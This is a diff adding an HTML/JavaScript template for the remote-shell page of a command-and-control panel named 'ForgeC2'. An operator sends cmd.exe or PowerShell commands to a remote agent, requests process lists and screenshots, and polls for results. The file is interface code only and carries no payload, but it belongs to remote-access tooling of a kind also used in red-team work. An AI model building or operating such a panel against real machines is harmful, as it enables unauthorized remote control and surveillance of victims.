@@ -1,0 +1,214 @@
+{{define "shell_content"}}
+<div class="h-screen flex flex-col bg-slate-900">
+    <!-- Header -->
+    <div class="bg-slate-800 border-b border-slate-700 px-6 py-3 flex items-center justify-between">
+        <div class="flex items-center gap-x-4">
+            <a href="/agents" class="text-slate-400 hover:text-slate-200">
+                <i class="fa-solid fa-arrow-left text-lg"></i>
+            </a>
+            <div>
+                <h1 class="text-xl font-semibold text-white">{{.Agent.Hostname}}</h1>
+                <div class="flex items-center gap-x-2 text-xs text-slate-400">
+                    <span>{{.Agent.Username}}@{{.Agent.IP}}</span>
+                    {{if eq .Agent.Status "online"}}
+                    <span class="flex items-center text-emerald-400"><i class="fa-solid fa-circle fa-beat mr-1 text-[6px]"></i> LIVE</span>
+                    {{else}}
+                    <span class="text-red-400">OFFLINE</span>
+                    {{end}}
+                </div>
+            </div>
+        </div>
+        <div class="flex items-center gap-x-2">
+            <select id="shell-select" class="bg-slate-700 border border-slate-600 text-white text-sm rounded-lg px-3 h-8">
+                <option value="cmd.exe">cmd.exe</option>
+                <option value="powershell.exe">powershell.exe</option>
+            </select>
+            <button onclick="requestPS()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="进程列表">
+                <i class="fa-solid fa-list mr-1"></i> PS
+            </button>
+            <button onclick="requestScreenshot()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="截图">
+                <i class="fa-solid fa-camera mr-1"></i> 截图
+            </button>
+            <button onclick="clearTerminal()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg">
+                <i class="fa-solid fa-trash mr-1"></i> Clear
+            </button>
+        </div>
+    </div>
+
+    <!-- Terminal Output -->
+    <div id="terminal-output" class="flex-1 overflow-auto p-4 font-mono text-sm text-emerald-300 bg-slate-900">
+        <div class="text-slate-500">ForgeC2 Shell Terminal - Agent: {{.Agent.Hostname}}</div>
+        <div class="text-slate-500">Type commands and press Enter to execute...</div>
+        <div class="text-slate-500 mb-4">---</div>
+    </div>
+
+    <!-- Command Input -->
+    <div class="bg-slate-800 border-t border-slate-700 px-6 py-4">
+        <div class="flex gap-2">
+            <div class="flex-1 relative">
+                <span id="prompt" class="absolute left-3 top-1/2 -translate-y-1/2 text-emerald-400 font-mono">CMD></span>
+                <input type="text" id="cmd-input" placeholder="" 
+                       class="w-full bg-slate-700 border border-slate-600 text-white font-mono text-sm rounded-lg pl-12 pr-4 h-11 focus:border-emerald-500 focus:outline-none"
+                       onkeydown="handleKeyDown(event)">
+            </div>
+            <button onclick="executeCommand()" class="px-6 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg h-11 text-sm font-medium">
+                <i class="fa-solid fa-play mr-1"></i> Execute
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const agentId = '{{.Agent.ID}}';
+    let commandHistory = [];
+    let historyIndex = -1;
+
+    function handleKeyDown(event) {
+        if (event.key === 'Enter') {
+            executeCommand();
+        } else if (event.key === 'ArrowUp') {
+            if (historyIndex > 0) {
+                historyIndex--;
+                document.getElementById('cmd-input').value = commandHistory[historyIndex];
+            }
+        } else if (event.key === 'ArrowDown') {
+            if (historyIndex < commandHistory.length - 1) {
+                historyIndex++;
+                document.getElementById('cmd-input').value = commandHistory[historyIndex];
+            } else {
+                historyIndex = commandHistory.length;
+                document.getElementById('cmd-input').value = '';
+            }
+        }
+    }
+
+    function requestPS() {
+        fetch(`/agents/${agentId}/ps`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    appendOutput('<span class="text-amber-400">PS></span> <span class="text-white">tasklist</span>');
+                    appendOutput('<span class="text-slate-500">进程列表已请求...</span>');
+                    setTimeout(() => fetchResult(data.task_id), 2000);
+                }
+            });
+    }
+
+    function requestScreenshot() {
+        fetch(`/agents/${agentId}/screenshot`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">screenshot</span>');
+                    appendOutput('<span class="text-slate-500">截图已请求...</span>');
+                    setTimeout(() => fetchResult(data.task_id), 3000);
+                }
+            });
+    }
+
+    function executeCommand() {
+        const input = document.getElementById('cmd-input');
+        const cmd = input.value.trim();
+        const shell = document.getElementById('shell-select').value;
+        
+        if (!cmd) return;
+        
+        // Add to history
+        commandHistory.push(cmd);
+        historyIndex = commandHistory.length;
+        
+        // Update prompt
+        const prompt = shell === 'powershell.exe' ? 'PS>' : 'CMD>';
+        document.getElementById('prompt').textContent = prompt;
+        
+        // Display command
+        appendOutput(`<span class="text-amber-400">${prompt}</span> <span class="text-white">${escapeHtml(cmd)}</span>`);
+        
+        // Clear input
+        input.value = '';
+        
+        // Send command
+        appendOutput('<span class="text-slate-500">Executing...</span>');
+        
+        fetch(`/agents/${agentId}/command`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `command=${encodeURIComponent(cmd)}&shell=${shell}`
+        }).then(r => r.json()).then(data => {
+            if (data.success) {
+                // Wait for result
+                setTimeout(() => fetchResult(data.task_id), 2000);
+            } else {
+                appendOutput('<span class="text-red-400">Error: ' + (data.error || 'Failed to send command') + '</span>');
+            }
+        }).catch(err => {
+            appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
+        });
+    }
+
+    function fetchResult(taskId) {
+        fetch(`/agents/${agentId}/tasks/${taskId}`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.error) {
+                    appendOutput('<span class="text-red-400">Error: ' + escapeHtml(data.error) + '</span>');
+                    return;
+                }
+                
+                const status = data.status;
+                
+                if (status === 'completed') {
+                    if (data.result && data.result.trim()) {
+                        appendOutput('<span class="text-emerald-300">' + escapeHtml(data.result) + '</span>');
+                    } else {
+                        appendOutput('<span class="text-emerald-300">Command executed successfully</span>');
+                    }
+                } else if (status === 'failed') {
+                    if (data.error && data.error.trim()) {
+                        appendOutput('<span class="text-red-400">' + escapeHtml(data.error) + '</span>');
+                    } else {
+                        appendOutput('<span class="text-red-400">Command failed</span>');
+                    }
+                } else {
+                    // Still pending or running
+                    appendOutput('<span class="text-yellow-400">Waiting for response...</span>');
+                    setTimeout(() => fetchResult(taskId), 3000);
+                }
+            }).catch(err => {
+                appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
+            });
+    }
+
+    function appendOutput(html) {
+        const output = document.getElementById('terminal-output');
+        const line = document.createElement('div');
+        line.innerHTML = html;
+        output.appendChild(line);
+        output.scrollTop = output.scrollHeight;
+    }
+
+    function clearTerminal() {
+        const output = document.getElementById('terminal-output');
+        output.innerHTML = `
+            <div class="text-slate-500">ForgeC2 Shell Terminal - Agent: {{.Agent.Hostname}}</div>
+            <div class="text-slate-500">Terminal cleared.</div>
+            <div class="text-slate-500 mb-4">---</div>
+        `;
+    }
+
+    function escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    // Update prompt when shell changes
+    document.getElementById('shell-select').addEventListener('change', function() {
+        const prompt = this.value === 'powershell.exe' ? 'PS>' : 'CMD>';
+        document.getElementById('prompt').textContent = prompt;
+    });
+
+    // Focus input on load
+    document.getElementById('cmd-input').focus();
+</script>
+{{end}}
